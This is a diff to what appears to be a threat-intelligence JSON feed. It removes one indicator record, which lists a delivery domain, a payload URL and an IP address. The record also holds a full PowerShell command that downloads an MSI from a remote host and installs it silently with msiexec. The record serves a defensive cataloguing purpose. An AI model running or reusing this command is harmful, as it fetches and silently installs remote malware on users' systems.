@@ -326,24 +326,5 @@
     ],
     "ReportId": "cmwf2w2a00fkl0oml1ac8kcxp",
     "ScannedAt": "2026-11-13T14:34:52.466000+00:00"
-  },
-  {
-    "UrlDomain": "distinctiontraining.com.au",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "82.38.138.35"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwezgr170fas0omlma6arc0q",
-    "ScannedAt": "2026-11-13T12:58:59.214000+00:00"
   }
 ]
